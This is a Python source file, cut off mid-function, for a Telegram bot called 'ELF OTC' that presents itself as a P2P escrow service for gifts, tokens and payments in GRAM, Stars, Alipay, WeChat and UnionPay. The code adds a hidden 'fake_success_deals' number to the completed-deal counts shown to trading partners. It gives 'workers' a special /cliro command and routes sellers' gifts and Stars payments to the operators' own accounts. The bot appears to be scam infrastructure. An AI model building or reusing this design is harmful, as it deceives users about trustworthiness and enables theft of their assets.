import asyncio
import secrets
from decimal import Decimal, InvalidOperation
from pathlib import Path

from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command, CommandObject
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton,
    FSInputFile, LinkPreviewOptions,
)
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from sqlalchemy import select, update, func

from db import init_db, SessionLocal
from models import User, Deal, LedgerEntry, TopUpRequest

# ============================================================
#  НАСТРОЙКИ — впиши сюда. .env не нужен.
# ============================================================
TOKEN = "PASTE_BOT_TOKEN_HERE"          # токен от @BotFather
ADMIN_IDS = {195391265}                 # твой Telegram ID (число из @userinfobot)
# Юзернеймы воркеров (без @) — им тоже доступен /cliro
WORKER_USERNAMES = {"cliro"}
# ============================================================

TON_DEPOSIT_ADDRESS = "UQD9qii_hUBsLpDi1HRj3oMTcZmwoVRbMBhcMi_DZVJJcykT"
STARS_USERNAME = "@cliro"
INSTRUCTIONS_URL = "https://t.me/OTC_instructions"
BANNER_PATH = Path(__file__).parent / "banner.jpg"


def is_worker(user) -> bool:
    """Доступ к /cliro: ADMIN_IDS или username из WORKER_USERNAMES."""
    if user is None:
        return False
    if user.id in ADMIN_IDS:
        return True
    uname = (user.username or "").lower()
    return uname in {x.lower() for x in WORKER_USERNAMES}

if not TOKEN or TOKEN == "PASTE_BOT_TOKEN_HERE":
    raise RuntimeError("Открой bot.py и впиши TOKEN в начале файла.")

bot = Bot(TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

# Custom emoji IDs
E_WALLET = "5444960062407732826"
E_USER = "5373012449597335010"
E_PIN = "5447187153274567373"
E_BANK = "5264895611517300926"
E_MONEY = "5375296873982604963"
E_NOTE = "5334882760735598374"
E_WARN = "5447381715293074599"
E_CREATE = "5334882760735598374"
E_WALLET_BTN = "5379600444098093058"
E_BALANCE = "5431577498364158238"
E_REF = "5357080225463149588"
E_LANG = "5445326466067754897"
E_SUPPORT = "5467539229468793355"
E_TON = "5471952986970267163"
E_CARD = "5447453226498552490"
E_STARS = "5463289097336405244"
E_RUB = "5350708147558297488"       # legacy
E_GIFT = "5203996991054432397"      # 🎁 подарок
E_HOME = "5465226866321268133"
E_BRIEFCASE = "5359785904535774578"
E_BOOK = "5226512880362332956"
E_DOT = "5204202247541497753"


def ce(eid: str, fb: str) -> str:
    return f'<tg-emoji emoji-id="{eid}">{fb}</tg-emoji>'


def fmt_amount(v) -> str:
    """500.0000 -> 500, 1.5000 -> 1.5"""
    d = Decimal(str(v)).normalize()
    s = format(d, 'f')
    if '.' in s:
        s = s.rstrip('0').rstrip('.')
    return s or '0'


def cur_emoji(currency: str) -> str:
    c = (currency or '').upper()
    if c in ('STARS', 'STAR'):
        return ce(E_STARS, '⭐')
    if c in ('GRAM', 'TON'):
        return ce(E_TON, '💎')
    return ce(E_RUB, '💰')


# Статусы сделки + кастомные эмодзи
STATUS_EMOJI = {
    "open": E_NOTE,              # 📝 ждёт покупателя
    "escrow": E_MONEY,           # 💰 средства в резерве
    "waiting_support": E_SUPPORT,  # 📞 на проверке у саппорта
    "completed": E_GIFT,         # 🎁 завершена
    "dispute": E_WARN,           # ⚠️ спор
}
STATUS_FALLBACK = {
    "open": "📝",
    "escrow": "💰",
    "waiting_support": "📞",
    "completed": "✅",
    "dispute": "⚠️",
}
STATUS_LABEL = {
    "open": {"ru": "Ожидает покупателя", "en": "Waiting for buyer", "zh": "等待买家"},
    "escrow": {"ru": "Оплата получена · передайте подарок", "en": "Paid · transfer the gift", "zh": "已收到付款 · 请转交礼物"},
    "waiting_support": {"ru": "На проверке у саппорта", "en": "Under support review", "zh": "客服正在审核"},
    "completed": {"ru": "Завершена", "en": "Completed", "zh": "已完成"},
    "dispute": {"ru": "Спор", "en": "发起争议", "zh": "争议处理中"},
}


def deal_status_line(status: str, lang: str = "zh") -> str:
    st = status or "open"
    eid = STATUS_EMOJI.get(st, E_NOTE)
    fb = STATUS_FALLBACK.get(st, "•")
    label = STATUS_LABEL.get(st, {}).get("zh") or STATUS_LABEL.get(st, {}).get("ru") or st
    return f"{ce(eid, fb)} <b>状态:</b> {label}"


class DealForm(StatesGroup):
    method = State()
    requisites = State()
    amount = State()
    description = State()
    gift_link = State()


class TopUpForm(StatesGroup):
    method = State()
    amount = State()
    proof = State()


class WalletForm(StatesGroup):
    ton = State()
    card = State()


class SupportForm(StatesGroup):
    message = State()


def home_btn(lang: str = "zh") -> InlineKeyboardButton:
    text = "В главное меню" if lang == "ru" else "返回主菜单"
    return InlineKeyboardButton(
        text=text,
        callback_data="main_menu",
        icon_custom_emoji_id=E_HOME,
    )


def main_kb(lang: str = "zh") -> InlineKeyboardMarkup:
    if lang == "ru":
        labels = {
            "create": "Создать сделку", "wallet": "Добавить/изменить кошелёк",
            "balance": "Баланс", "referral": "Рефералка", "support": "Тех-поддержка",
        }
    else:
        labels = {
            "create": "创建交易", "wallet": "添加/修改收款方式",
            "balance": "账户余额", "referral": "邀请奖励", "support": "联系客服",
        }
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=labels["create"], callback_data="create_deal", icon_custom_emoji_id=E_CREATE)],
        [InlineKeyboardButton(text=labels["wallet"], callback_data="wallet", icon_custom_emoji_id=E_WALLET_BTN)],
        [InlineKeyboardButton(text=labels["balance"], callback_data="balance", icon_custom_emoji_id=E_BALANCE)],
        [InlineKeyboardButton(text=labels["referral"], callback_data="referral", icon_custom_emoji_id=E_REF)],
        [InlineKeyboardButton(text=labels["support"], callback_data="support", icon_custom_emoji_id=E_SUPPORT)],
    ])


def start_caption(lang: str = "zh") -> str:
    if lang == "ru":
        return (
            "<b>Добро пожаловать в ELF OTC – надёжный P2P-гарант</b>\n\n"
            f"{ce(E_BRIEFCASE, '💼')} <b>Покупайте и продавайте всё, что угодно – безопасно!</b>\n"
            "От Telegram-подарков и NFT до токенов и фиата – сделки проходят легко и без риска.\n\n"
            f"{ce(E_DOT, '🔹️')} Удобное управление кошельками\n"
            f"{ce(E_DOT, '🔹️')} Реферальная система\n\n"
            f"{ce(E_BOOK, '📖')} <b>Как пользоваться?</b>\n"
            f"Ознакомьтесь с <a href=\"{INSTRUCTIONS_URL}\">ИНСТРУКЦИЕЙ</a>\n\n"
            "Выберите нужный раздел ниже:"
        )
    return (
        "<b>欢迎使用 ELF OTC — 可靠的 P2P 担保交易平台</b>\n\n"
        f"{ce(E_BRIEFCASE, '💼')} <b>安全买卖各类商品！</b>\n"
        "从 Telegram 礼物、NFT 到代币和法币，让交易更简单。\n\n"
        f"{ce(E_DOT, '🔹️')} 便捷的收款方式管理\n"
        f"{ce(E_DOT, '🔹️')} 邀请奖励计划\n\n"
        f"{ce(E_BOOK, '📖')} <b>使用指南</b>\n"
        f"请查看<a href=\"{INSTRUCTIONS_URL}\">使用说明</a>\n\n"
        "请选择下方功能："
    )


async def ensure_user(session, tg_user) -> User:
    user = await session.scalar(select(User).where(User.telegram_id == tg_user.id))
    if user is None:
        user = User(telegram_id=tg_user.id, username=tg_user.username or "")
        session.add(user)
        await session.flush()
    else:
        user.username = tg_user.username or user.username
    return user


async def get_lang(tg_user) -> str:
    """Всегда китайский — бот полностью на zh."""
    async with SessionLocal() as session:
        user = await ensure_user(session, tg_user)
        if user.language != "zh":
            user.language = "zh"
            await session.commit()
        else:
            await session.commit()
        return "zh"


# ---------- i18n ----------
T = {
    "home": {"ru": "В главное меню", "en": "Home"},
    "choose_pay_method": {
        "ru": "{e} <b>Выберите метод получения оплаты:</b>",
        "en": "{e} <b>Choose payment method:</b>",
    },
    "ton": {"ru": "TON", "en": "TON"},
    "card": {"ru": "Карта РФ", "en": "RF Card"},
    "stars": {"ru": "Stars", "en": "Stars"},
    "enter_amount_ton": {
        "ru": "<b>Введите сумму сделки в TON:</b>\n\nПример: <code>1.5</code>",
        "en": "<b>Enter deal amount in TON:</b>\n\nExample: <code>1.5</code>",
    },
    "enter_amount_stars": {
        "ru": "<b>Введите сумму сделки в Stars:</b>\n\nПример: <code>100</code>",
        "en": "<b>Enter deal amount in Stars:</b>\n\nExample: <code>100</code>",
    },
    "enter_amount_rub": {
        "ru": "<b>Введите сумму сделки в RUB:</b>\n\nПример: <code>500</code>",
        "en": "<b>Enter deal amount in RUB:</b>\n\nExample: <code>500</code>",
    },
    "enter_gift_name": {
        "ru": "Введите название подарка:",
        "en": "Enter gift name:",
    },
    "enter_gift_link": {
        "ru": "<b>Отправьте ссылку на подарок</b>:\n\nЕсли ссылки нет — напишите <code>-</code>",
        "en": "<b>Send gift link</b>:\n\nIf none — type <code>-</code>",
    },
    "need_ton": {
        "ru": "Сначала укажи <b>GRAM-адрес</b> для получения оплаты.\n\nВведи адрес кошелька:",
        "en": "First enter your <b>GRAM address</b> to receive payment.\n\nSend wallet address:",
    },
    "need_card": {
        "ru": "Сначала укажи <b>номер телефона / карты (СБП)</b> для получения оплаты.\n\nВведи номер (например +79001234567):",
        "en": "First enter your <b>phone / SBP card</b> to receive payment.\n\nSend number (e.g. +79001234567):",
    },
    "deal_created": {
        "ru": "{note} <b>Сделка создана!</b>\n<code>#{code}</code>\n\n{money} Сумма: <b>{amount} {currency}</b>\n{gift_e} Подарок: <b>{desc}</b>{extra}\n\n{user} Ссылка для покупателя:\n{link}",
        "en": "{note} <b>Deal created!</b>\n<code>#{code}</code>\n\n{money} Amount: <b>{amount} {currency}</b>\n{gift_e} Gift: <b>{desc}</b>{extra}\n\n{user} Buyer link:\n{link}",
    },
    "balance": {
        "ru": "{e} <b>Ваш баланс:</b>\nGRAM: {ton}\nStars: {stars}",
        "en": "{e} <b>Your balance:</b>\nGRAM: {ton}\nStars: {stars}",
    },
    "topup_btn": {"ru": "Пополнить баланс", "en": "Top up"},
    "withdraw_btn": {"ru": "Вывести", "en": "Withdraw"},
    "choose_topup": {
        "ru": "Выберите валюту пополнения:",
        "en": "Choose top-up currency:",
    },
    "referral": {
        "ru": "{e} <b>Реферальная программа</b>\n\nВаша ссылка:\n{link}\n\nПриглашайте друзей и получайте бонусы.",
        "en": "{e} <b>Referral program</b>\n\nYour link:\n{link}\n\nInvite friends and get bonuses.",
    },
    "support": {
        "ru": "Напишите сообщение в поддержку — мы ответим.",
        "en": "Write a message to support — we will reply.",
    },
    "choose_lang": {
        "ru": "<b>Выберите язык:</b>",
        "en": "<b>Choose language:</b>",
    },
    "wallet_menu": {
        "ru": "{e} <b>Ваши реквизиты</b>\n\nTON: <code>{ton}</code>\nAlipay: <code>{alipay}</code>\\nWeChat Pay: <code>{wechat}</code>\\nUnionPay: <code>{unionpay}</code>",
        "en": "{e} <b>Your payment details</b>\n\nTON: <code>{ton}</code>\nSBP/card: <code>{card}</code>",
    },
    "buyer_info": {
        "ru": "{wallet} <b>Информация о сделке</b>\n<code>#{code}</code>\n{status}\n\n{user} Вы покупатель в сделке.\n{pin} Продавец: {seller}\n• Успешные сделки: {done}\n• Вы покупаете подарок: {desc}\n{gift_line}{bank} {pay_label}:\n<code>{pay_to}</code>\n{money} Сумма к оплате: <b>{amount} {currency}</b>\n{note} Комментарий (memo): <code>{memo}</code>\n\n{warn} Убедитесь в правильности данных перед оплатой. Комментарий (memo) обязателен!\nПосле оплаты ожидайте подтверждения. Также можно нажать «Проверить оплату».",
        "en": "{wallet} <b>Deal info</b>\n<code>#{code}</code>\n{status}\n\n{user} You are the buyer.\n{pin} Seller: {seller}\n• Successful deals: {done}\n• You buy gift: {desc}\n{gift_line}{bank} {pay_label}:\n<code>{pay_to}</code>\n{money} Amount: <b>{amount} {currency}</b>\n{note} Payment comment (memo): <code>{memo}</code>\n\n{warn} Check the details before paying. Memo is required!\nAfter payment wait for confirmation. You can also tap «Check payment».",
    },
    "check_pay": {"ru": "Проверить оплату", "en": "Check payment"},
    "pay_balance": {"ru": "Оплатить с баланса", "en": "Pay from balance"},
    "funds_reserved": {
        "ru": "{e} <b>Средства зарезервированы.</b>\n{status}\n\nСумма <b>{amount} {currency}</b> заморожена до передачи подарка.\nПродавец получил инструкцию передать подарок «{desc}» на {support}.\nОжидайте завершения сделки.",
        "en": "{e} <b>Funds reserved.</b>\n{status}\n\nAmount <b>{amount} {currency}</b> is held until gift transfer.\nSeller was instructed to send gift «{desc}» to {support}.\nWait for deal completion.",
    },
    "seller_paid": {
        "ru": "{gift} <b>Оплата по сделке #{code} получена!</b>\n\nПередайте, пожалуйста, подарок:\n<b>{desc}</b>{gift_line}\n\n{cur} Сумма: <b>{amount} {currency}</b> (зарезервирована)\n\n{user} Получатель (саппорт): {support}\n\n1) Нажмите «Передать подарок» — откроется чат с саппортом.\n2) После передачи нажмите «Подтвердить передачу» — средства зачислятся на ваш баланс.",
        "en": "{gift} <b>Payment for deal #{code} received!</b>\n\nPlease transfer the gift:\n<b>{desc}</b>{gift_line}\n\n{cur} Amount: <b>{amount} {currency}</b> (reserved)\n\n{user} Recipient (support): {support}\n\n1) Tap «Transfer gift» — opens chat with support.\n2) After transfer tap «Confirm transfer» — funds will be credited.",
    },
    "transfer_gift": {"ru": "Передать подарок", "en": "Transfer gift"},
    "confirm_transfer": {"ru": "Подтвердить передачу", "en": "Confirm transfer"},
    "i_transferred": {"ru": "Я передал подарок", "en": "I transferred the gift"},
    "waiting_support": {
        "ru": "{status}\n\n✅ Вы отметили передачу. Ожидайте проверки саппортом {support}.\nСредства будут зачислены после подтверждения.",
        "en": "{status}\n\n✅ You marked the transfer. Waiting for support {support} to verify.\nFunds will be credited after confirmation.",
    },
    "admin_confirm_gift": {"ru": "✅ Подарок получен — зачислить", "en": "✅ Gift received — credit funds"},
    "seller_marked": {
        "ru": "{bell} <b>Продавец отметил передачу</b>\nСделка <code>#{code}</code>\n\n{gift} Подарок: <b>{desc}</b>{gift_line}\n{money} Сумма: <b>{amount} {currency}</b>\n{user} Получатель: {support}\n\n{warn} Проверьте подарок и нажмите кнопку ниже.",
        "en": "{bell} <b>Seller marked gift transfer</b>\nDeal <code>#{code}</code>\n\n{gift} Gift: <b>{desc}</b>{gift_line}\n{money} Amount: <b>{amount} {currency}</b>\n{user} Recipient: {support}\n\n{warn} Verify the gift and press the button below.",
    },
    "admin_credit_btn": {"ru": "礼物已收到 — 入账", "en": "已收到礼物 — 入账"},
    "funds_credited": {
        "ru": "{status}\n\n✅ <b>Передача подтверждена саппортом.</b>\n\nСредства <b>{amount} {currency}</b> зачислены вам на баланс.\nСделка #{code} завершена.",
        "en": "{status}\n\n✅ <b>Transfer confirmed by support.</b>\n\nFunds <b>{amount} {currency}</b> credited to your balance.\nDeal #{code} completed.",
    },
    "new_buyer": {
        "ru": "🔔 <b>Новый покупатель для сделки #{code}!</b>\nПокупатель: {buyer}\n({n} успешных сделок)",
        "en": "🔔 <b>New buyer for deal #{code}!</b>\nBuyer: {buyer}\n({n} successful deals)",
    },
}

# 简体中文界面文案
T_ZH = {
    'home': '返回主菜单',
    'choose_pay_method': '{e} <b>请选择收款方式：</b>',
    'ton': 'GRAM',
    'card': 'Alipay',
    'stars': 'Stars',
    'enter_amount_ton': '<b>请输入 GRAM 交易金额：</b>\n\n例如：<code>1.5</code>',
    'enter_amount_stars': '<b>请输入 Stars 交易金额：</b>\n\n例如：<code>100</code>',
    'enter_amount_rub': '<b>请输入 CNY 交易金额：</b>\n\n例如：<code>500</code>',
    'enter_gift_name': '请输入礼物名称：',
    'enter_gift_link': '<b>请发送礼物链接</b>：\n\n如果没有链接，请发送 <code>-</code>',
    'need_ton': '请先填写用于收款的 <b>GRAM 地址</b>。\n\n请输入钱包地址：',
    'need_card': '请先填写用于收款的 <b>支付宝 / 微信 / 银联</b> 账号。\n\n请输入收款账号：',
    'deal_created': '{note} <b>交易已创建！</b>\n<code>#{code}</code>\n\n{money} 金额：<b>{amount} {currency}</b>\n{gift_e} 礼物：<b>{desc}</b>{extra}\n\n{user} 买家链接：\n{link}',
    'balance': '{e} <b>账户余额：</b>\nGRAM：{ton}\nStars：{stars}',
    'topup_btn': '充值余额',
    'withdraw_btn': '提现',
    'choose_topup': '请选择充值币种：',
    'referral': '{e} <b>邀请奖励计划</b>\n\n您的邀请链接：\n{link}\n\n邀请好友即可获得奖励。',
    'support': '请发送您要咨询的内容，客服将尽快回复。',
    'choose_lang': '<b>请选择语言：</b>',
    'wallet_menu': '{e} <b>您的收款信息</b>\n\nGRAM：<code>{ton}</code>\nAlipay：<code>{alipay}</code>\nWeChat：<code>{wechat}</code>\nUnionPay：<code>{unionpay}</code>',
    'buyer_info': '{wallet} <b>交易信息</b>\n<code>#{code}</code>\n{status}\n\n{user} 您是本次交易的买家。\n{pin} 卖家：{seller}\n• 已完成交易：{done}\n• 您购买的礼物：{desc}\n{gift_line}{bank} {pay_label}：\n<code>{pay_to}</code>\n{money} 应付金额：<b>{amount} {currency}</b>\n{note} 付款备注（memo）：<code>{memo}</code>\n\n{warn} 付款前请仔细核对信息，必须填写备注（memo）！\n付款后请等待确认，也可以点击“检查付款”。',
    'check_pay': '检查付款',
    'pay_balance': '使用余额付款',
    'funds_reserved': '{e} <b>资金已冻结。</b>\n{status}\n\n金额 <b>{amount} {currency}</b> 将在礼物交付前暂时保留。\n卖家已收到指示，请将礼物“{desc}”发送给 {support}。\n请等待交易完成。',
    'seller_paid': '{gift} <b>交易 #{code} 的付款已收到！</b>\n\n请转交礼物：\n<b>{desc}</b>{gift_line}\n\n{cur} 金额：<b>{amount} {currency}</b>（已冻结）\n\n{user} 接收方（客服）：{support}\n\n1) 点击“转交礼物”打开客服聊天。\n2) 转交后点击“确认已转交”，款项将记入您的余额。',
    'transfer_gift': '转交礼物',
    'confirm_transfer': '确认转交',
    'i_transferred': '我已转交礼物',
    'waiting_support': '{status}\n\n✅ 您已标记礼物转交，请等待客服 {support} 审核。\n审核通过后，款项将记入余额。',
    'admin_confirm_gift': '✅ 已收到礼物 — 入账',
    'seller_marked': '{bell} <b>卖家已标记礼物转交</b>\n交易 <code>#{code}</code>\n\n{gift} 礼物：<b>{desc}</b>{gift_line}\n{money} 金额：<b>{amount} {currency}</b>\n{user} 接收方：{support}\n\n{warn} 请核实礼物并点击下方按钮。',
    'admin_credit_btn': '已收到礼物 — 入账',
    'funds_credited': '{status}\n\n✅ <b>客服已确认礼物转交。</b>\n\n金额 <b>{amount} {currency}</b> 已记入您的余额。\n交易 #{code} 已完成。',
    'new_buyer': '🔔 <b>交易 #{code} 有新买家！</b>\n买家：{buyer}\n（已完成 {n} 笔交易）',
}
for _key, _value in T_ZH.items():
    T.setdefault(_key, {})["zh"] = _value




def tr(lang: str, key: str, **kw) -> str:
    block = T.get(key, {})
    # Бот полностью на китайском
    s = block.get("zh") or block.get("ru") or block.get("en") or key
    if kw:
        try:
            return s.format(**kw)
        except Exception:
            return s
    return s




async def send_start(target, lang: str = "zh"):
    """Отправить стартовый экран с баннером."""
    caption = start_caption(lang)
    kb = main_kb(lang)
    if BANNER_PATH.exists():
        photo = FSInputFile(BANNER_PATH)
        if isinstance(target, Message):
            await target.answer_photo(photo, caption=caption, reply_markup=kb)
        else:
            # CallbackQuery — новое сообщение
            await target.message.answer_photo(photo, caption=caption, reply_markup=kb)
    else:
        if isinstance(target, Message):
            await target.answer(caption, reply_markup=kb, link_preview_options=LinkPreviewOptions(is_disabled=True))
        else:
            await target.message.answer(caption, reply_markup=kb, link_preview_options=LinkPreviewOptions(is_disabled=True))


async def new_deal_code(session) -> str:
    alphabet = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
    for _ in range(30):
        code = "".join(secrets.choice(alphabet) for _ in range(8))
        exists = await session.scalar(select(Deal.id).where(Deal.deal_code == code))
        if exists is None:
            return code
    raise RuntimeError("deal code alloc failed")


# ---------- /start ----------
@dp.message(Command("start"))
async def cmd_start(message: Message, command: CommandObject, state: FSMContext):
    await state.clear()
    async with SessionLocal() as session:
        user = await ensure_user(session, message.from_user)
        user.language = "zh"
        await session.commit()
        lang = "zh"

    if command.args and command.args.startswith("deal_"):
        try:
            deal_id = int(command.args.split("_", 1)[1])
            await show_deal(message, deal_id)
            return
        except (ValueError, IndexError):
            pass

    await send_start(message, lang)


@dp.callback_query(F.data == "main_menu")
async def cb_main_menu(call: CallbackQuery, state: FSMContext):
    await state.clear()
    lang = await get_lang(call.from_user)
    await call.answer()
    # удаляем старое сообщение если возможно и шлём новое со стартом
    try:
        await call.message.delete()
    except Exception:
        pass
    await send_start(call, lang)


# ---------- Баланс ----------
@dp.callback_query(F.data == "balance")
async def cb_balance(call: CallbackQuery):
    lang = await get_lang(call.from_user)
    async with SessionLocal() as session:
        user = await ensure_user(session, call.from_user)
        await session.commit()
        text = (
            f"{ce(E_MONEY, '💰')} <b>账户余额：</b>\n"
            f"GRAM：{fmt_amount(user.balance_ton)}\n"
            f"CNY（元）：{fmt_amount(user.balance_rub)}\n"
            f"Stars：{fmt_amount(user.balance_stars)}"
        )
        kb = InlineKeyboardMarkup(inline_keyboard=[[home_btn(lang)]])
        try:
            await call.message.edit_text(text, reply_markup=kb)
        except Exception:
            await call.message.answer(text, reply_markup=kb)
    await call.answer()


@dp.callback_query(F.data == "create_deal")
async def cb_create_deal(call: CallbackQuery, state: FSMContext):
    await state.clear()
    lang = await get_lang(call.from_user)
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 GRAM", callback_data="deal_method:gram", icon_custom_emoji_id=E_TON)],
        [InlineKeyboardButton(text="⭐ Telegram Stars", callback_data="deal_method:stars", icon_custom_emoji_id=E_STARS)],
        [InlineKeyboardButton(text="支付宝 Alipay", callback_data="deal_method:alipay")],
        [InlineKeyboardButton(text="微信支付 WeChat Pay", callback_data="deal_method:wechat")],
        [InlineKeyboardButton(text="银联 UnionPay", callback_data="deal_method:unionpay")],
        [home_btn(lang)],
    ])
    text = tr(lang, "choose_pay_method", e=ce(E_MONEY, "💰"))
    try:
        await call.message.edit_text(text, reply_markup=kb)
    except Exception:
        await call.message.answer(text, reply_markup=kb)
    await call.answer()


@dp.callback_query(F.data.startswith("deal_method:"))
async def cb_deal_method(call: CallbackQuery, state: FSMContext):
    method = call.data.split(":")[1]
    if method not in ("gram", "ton", "alipay", "wechat", "unionpay", "stars"):
        await call.answer()
        return
    await state.update_data(method=method)
    lang = await get_lang(call.from_user)

    async with SessionLocal() as session:
        user = await ensure_user(session, call.from_user)
        await session.commit()
        ton_w = (user.ton_wallet or "").strip()
        pay_fields = {
            "alipay": (user.alipay_account or "").strip(),
            "wechat": (user.wechat_account or "").strip(),
            "unionpay": (user.unionpay_details or "").strip(),
        }
        card_w = pay_fields.get(method, "")

    if method in ("gram", "ton") and not ton_w:
        await state.set_state(DealForm.requisites)
        await call.message.edit_text(
            tr(lang, "need_ton"),
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn(lang)]]),
        )
        await call.answer()
        return
    if method in ("alipay", "wechat", "unionpay") and not card_w:
        await state.set_state(DealForm.requisites)
        await call.message.edit_text(
            tr(lang, "need_card"),
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn(lang)]]),
        )
        await call.answer()
        return

    await state.set_state(DealForm.amount)
    if method in ("gram", "ton"):
        prompt = "<b>请输入交易金额（GRAM）：</b>\n\n例如：<code>1.5</code>"
    elif method == "stars":
        prompt = tr(lang, "enter_amount_stars")
    else:
        prompt = "<b>请输入交易金额（CNY）：</b>\n\n例如：<code>100</code>"
    await call.message.edit_text(
        prompt,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn(lang)]]),
    )
    await call.answer()


@dp.message(DealForm.requisites)
async def deal_save_requisites(message: Message, state: FSMContext):
    data = await state.get_data()
    method = data.get("method", "ton")
    value = (message.text or "").strip()
    if len(value) < 5:
        await message.answer(
            "输入内容太短，请输入有效的号码或地址。",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn()]]),
        )
        return
    async with SessionLocal() as session:
        user = await ensure_user(session, message.from_user)
        if method in ("gram", "ton"):
            user.ton_wallet = value[:128]  # legacy DB column stores GRAM wallet
        elif method == "alipay":
            user.alipay_account = value[:128]
        elif method == "wechat":
            user.wechat_account = value[:128]
        elif method == "unionpay":
            user.unionpay_details = value[:256]
        await session.commit()

    await state.set_state(DealForm.amount)
    if method in ("gram", "ton"):
        prompt = (
            "✅ GRAM 地址已保存。\n\n"
            "<b>请输入交易金额（GRAM）：</b>\n\n例如：<code>1.5</code>"
        )
    else:
        prompt = (
            "✅ 收款信息已保存。\n\n"
            "<b>请输入交易金额（CNY）：</b>\n\n例如：<code>500</code>"
        )
    await message.answer(
        prompt,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn()]]),
    )


@dp.message(DealForm.amount)
async def deal_amount(message: Message, state: FSMContext):
    try:
        amount = Decimal(message.text.replace(",", ".")).quantize(Decimal("0.0001"))
        if amount <= 0:
            raise InvalidOperation
    except Exception:
        lang = await get_lang(message.from_user)
        await message.answer(
            "请输入有效金额，例如 1.5" if lang == "zh" else "请输入有效金额，例如 1.5",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn(lang)]]),
        )
        return
    await state.update_data(amount=str(amount))
    lang = await get_lang(message.from_user)
    await state.set_state(DealForm.description)
    await message.answer(
        tr(lang, "enter_gift_name"),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn(lang)]]),
    )


@dp.message(DealForm.description)
async def deal_description(message: Message, state: FSMContext):
    lang = await get_lang(message.from_user)
    name = (message.text or "").strip()[:500]
    if not name:
        await message.answer(tr(lang, "enter_gift_name"))
        return
    await state.update_data(description=name)
    await state.set_state(DealForm.gift_link)
    await message.answer(
        tr(lang, "enter_gift_link"),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn(lang)]]),
    )


@dp.message(DealForm.gift_link)
async def deal_gift_link(message: Message, state: FSMContext):
    lang = await get_lang(message.from_user)
    data = await state.get_data()
    method = data.get("method", "ton")
    amount = Decimal(data["amount"])
    description = data.get("description", "")
    link_raw = (message.text or "").strip()
    gift_link = "" if link_raw in ("-", "—", "нет", "Нет", "no", "No", "none") else link_raw[:512]
    currency_map = {"gram": "GRAM", "ton": "GRAM", "alipay": "CNY", "wechat": "CNY", "unionpay": "CNY", "stars": "Stars"}
    currency = currency_map.get(method, "TON")
    async with SessionLocal() as session:
        seller = await ensure_user(session, message.from_user)
        deal = Deal(
            seller_id=seller.id,
            amount=amount,
            currency=currency,
            pay_method=method,
            description=description,
            gift_link=gift_link,
            deal_code=await new_deal_code(session),
            status="open",
        )
        session.add(deal)
        await session.commit()
        await session.refresh(deal)
        me = await bot.get_me()
        link = f"https://t.me/{me.username}?start=deal_{deal.id}"
        code = deal.deal_code
    await state.clear()
    if gift_link:
        extra = ("\n" + ce(E_PIN, "📍") + (" 礼物链接：" if lang == "zh" else " Ссылка: ") + gift_link)
    else:
        extra = ""
    if lang == "zh":
        text = (
            f"{ce(E_NOTE, '📝')} <b>交易已创建！</b>\n{deal_status_line('open', 'en')}\n"
            f"<code>#{code}</code>\n\n"
            f"{cur_emoji(currency)} 金额：<b>{fmt_amount(amount)} {currency}</b>\n"
            f"{ce(E_BRIEFCASE, '💼')} 礼物：<b>{description}</b>{extra}\n\n"
            f"{ce(E_USER, '👤')} 买家链接：\n{link}"
        )
    else:
        text = (
            f"{ce(E_NOTE, '📝')} <b>交易已创建！</b>\n{deal_status_line('open', 'en')}\n"
            f"<code>#{code}</code>\n\n"
            f"{cur_emoji(currency)} 金额：<b>{fmt_amount(amount)} {currency}</b>\n"
            f"{ce(E_BRIEFCASE, '💼')} 礼物：<b>{description}</b>{extra}\n\n"
            f"{ce(E_USER, '👤')} 买家链接：\n{link}"
        )
    await message.answer(
        text,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn(lang)]]),
        disable_web_page_preview=True,
    )


async def show_deal(message: Message, deal_id: int):
    lang = await get_lang(message.from_user)
    async with SessionLocal() as session:
        deal = await session.get(Deal, deal_id)
        if not deal or deal.status != "open":
            await message.answer("未找到交易，或该交易已不可用。" if lang == "zh" else "未找到交易，或该交易已不可用。")
            return
        seller = await session.get(User, deal.seller_id)
        seller_name = f"@{seller.username}" if seller and seller.username else "—"
        real_completed = await session.scalar(
            select(func.count()).select_from(Deal).where(
                Deal.seller_id == deal.seller_id, Deal.status == "completed"
            )
        ) or 0
        completed = real_completed + ((seller.fake_success_deals or 0) if seller else 0)

        if deal.pay_method in ("gram", "ton"):
            pay_to = seller.ton_wallet if seller and seller.ton_wallet else "请联系卖家确认"
            pay_label = "GRAM 收款地址" if lang == "zh" else "GRAM-адрес"
        elif deal.pay_method == "stars":
            pay_to = STARS_USERNAME
            pay_label = "Stars 收款账户"
        else:
            details = {
                "alipay": (seller.alipay_account if seller else "", "Alipay (支付宝)"),
                "wechat": (seller.wechat_account if seller else "", "WeChat Pay (微信支付)"),
                "unionpay": (seller.unionpay_details if seller else "", "UnionPay (银联)"),
            }
            pay_to, pay_label = details.get(deal.pay_method, ("", "收款方式"))
            pay_to = pay_to or "请联系卖家确认"

        buyer = message.from_user
        buyer_name = f"@{buyer.username}" if buyer.username else buyer.full_name
        buyer_user = await ensure_user(session, buyer)
        await session.commit()
        b_real = await session.scalar(
            select(func.count()).select_from(Deal).where(
                Deal.seller_id == buyer_user.id, Deal.status == "completed"
            )
        ) or 0
        b_completed = b_real + (buyer_user.fake_success_deals or 0)

        gift_line = ""
        if getattr(deal, "gift_link", None):
            gift_line = ("• Gift link: " if lang == "zh" else "• 礼物链接：") + f"{deal.gift_link}\n"

        text = tr(
            lang, "buyer_info",
            wallet=ce(E_WALLET, "👛"),
            code=deal.deal_code,
